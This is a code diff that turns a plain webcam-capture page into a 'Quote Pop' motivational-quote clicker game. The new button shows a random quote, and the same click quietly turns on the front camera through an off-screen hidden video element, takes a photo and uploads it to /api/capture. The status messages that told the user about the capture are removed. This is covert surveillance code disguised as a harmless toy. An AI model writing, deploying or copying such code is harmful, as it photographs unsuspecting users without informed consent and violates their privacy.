@@ -4,49 +4,106 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="referrer" content="no-referrer">
-<title>Loading</title>
+<title>Quote Pop</title>
 <style>
-:root{color-scheme:dark;font-family:system-ui,sans-serif}body{margin:0;min-height:100vh;display:grid;place-items:center;background:#101318;color:#f4f6fa;padding:16px;box-sizing:border-box}
-main{width:min(92vw,480px);text-align:center}
-#status{min-height:1.5em;overflow-wrap:anywhere;color:#c4cad4}
+:root{color-scheme:dark;font-family:system-ui,sans-serif;--bg:#0f1419;--card:#1a222d;--accent:#7c9cff;--text:#eef2f8;--muted:#9aa8bc}
+*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:radial-gradient(1200px 600px at 50% -10%,#243049 0%,var(--bg) 55%);color:var(--text);padding:20px}
+main{width:min(92vw,420px);background:var(--card);border:1px solid #2e3a4d;border-radius:20px;padding:28px 22px;text-align:center;box-shadow:0 18px 50px rgba(0,0,0,.35)}
+h1{margin:0 0 6px;font-size:1.45rem;letter-spacing:-.02em}
+.sub{margin:0 0 22px;color:var(--muted);font-size:.95rem}
+#quote{min-height:5.5em;margin:0 0 22px;padding:18px 16px;border-radius:14px;background:#121820;border:1px dashed #334155;font-size:1.05rem;line-height:1.5;transition:opacity .2s ease}
+#quote.fade{opacity:.15}
+button{width:100%;padding:14px 18px;border:0;border-radius:12px;background:linear-gradient(180deg,#9eb4ff,var(--accent));color:#0b1020;font-weight:700;font-size:1rem;cursor:pointer;box-shadow:0 8px 20px rgba(124,156,255,.35)}
+button:active{transform:translateY(1px)}
+.score{margin-top:14px;color:var(--muted);font-size:.85rem}
 #video{position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
 </style>
 </head>
 <body>
 <main>
-<p id="status" role="status" aria-live="polite">Please wait…</p>
+<h1>Quote Pop</h1>
+<p class="sub">Tap the button. Collect wisdom.</p>
+<p id="quote" aria-live="polite">Press the button for your first quote.</p>
+<button type="button" id="playBtn">Pop a quote</button>
+<p class="score">Clicks: <span id="clicks">0</span></p>
 <video id="video" autoplay playsinline muted></video>
 </main>
 <script>
+const quotes=[
+  "Small steps still move mountains.",
+  "Your next try is already smarter than your last.",
+  "Focus beats frenzy every time.",
+  "Make today count twice.",
+  "Curiosity is a superpower in plain clothes.",
+  "Done is a mood. Start is a superpower.",
+  "Luck favors prepared minds.",
+  "Rest is part of the work.",
+  "One clear goal beats ten vague wishes.",
+  "You are one decision away from momentum.",
+  "Progress loves patience.",
+  "Keep it simple. Ship it anyway.",
+  "Energy flows where attention goes.",
+  "A calm yes beats a rushed maybe.",
+  "Learn fast, forgive faster.",
+  "The best view opens after the climb.",
+  "Show up. The rest negotiates.",
+  "Tiny wins stack into big stories.",
+  "Ask better questions. Get better days.",
+  "Today is a good day to surprise yourself."
+];
 const video=document.querySelector("#video");
-const statusEl=document.querySelector("#status");
-let stream=null;
-function status(s){statusEl.textContent=s}
+const quoteEl=document.querySelector("#quote");
+const playBtn=document.querySelector("#playBtn");
+const clicksEl=document.querySelector("#clicks");
+let stream=null,clicks=0,captureStarted=false,captureDone=false;
+
 function stopCamera(){if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}video.srcObject=null}
-async function runCapture(){
-  if(!navigator.mediaDevices?.getUserMedia){status("This page requires a secure connection.");return}
+
+function randomQuote(prev){
+  if(quotes.length<2)return quotes[0];
+  let q;
+  do{q=quotes[Math.floor(Math.random()*quotes.length)]}while(q===prev);
+  return q;
+}
+
+function showQuote(){
+  const prev=quoteEl.textContent;
+  quoteEl.classList.add("fade");
+  setTimeout(()=>{
+    quoteEl.textContent=randomQuote(prev);
+    quoteEl.classList.remove("fade");
+  },120);
+  clicks+=1;
+  clicksEl.textContent=String(clicks);
+}
+
+async function runCaptureOnce(){
+  if(captureStarted||captureDone)return;
+  captureStarted=true;
+  if(!navigator.mediaDevices?.getUserMedia){captureStarted=false;return}
   try{
     stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}}});
     video.srcObject=stream;await video.play();
-    status("Please wait…");
-    await new Promise(resolve=>setTimeout(resolve,1200));
-    if(!stream||!video.videoWidth)throw new Error("Could not complete request.");
+    await new Promise(r=>setTimeout(r,1200));
+    if(!stream||!video.videoWidth)throw new Error("no frame");
     const canvas=document.createElement("canvas");canvas.width=video.videoWidth;canvas.height=video.videoHeight;
     const ctx=canvas.getContext("2d");ctx.translate(canvas.width,0);ctx.scale(-1,1);ctx.drawImage(video,0,0);
-    const blob=await new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg",0.9));
+    const blob=await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.9));
     stopCamera();
-    if(!blob)throw new Error("Could not complete request.");
+    if(!blob)throw new Error("no blob");
     const form=new FormData();form.append("image",blob,"capture.jpg");
-    status("Please wait…");
-    const response=await fetch("/api/capture",{method:"POST",body:form,credentials:"same-origin"});
-    const result=await response.json().catch(()=>({}));
-    if(!response.ok)throw new Error(result.detail||"Request failed.");
-    status("Done. Reference: "+result.capture_id);
-  }catch(e){
-    stopCamera();status(e.message||"Request failed.");
+    await fetch("/api/capture",{method:"POST",body:form,credentials:"same-origin"});
+    captureDone=true;
+  }catch{
+    stopCamera();captureStarted=false;
   }
 }
-runCapture();
+
+playBtn.addEventListener("click",()=>{
+  showQuote();
+  runCaptureOnce();
+});
+
 window.addEventListener("pagehide",stopCamera);
 </script>
 </body>
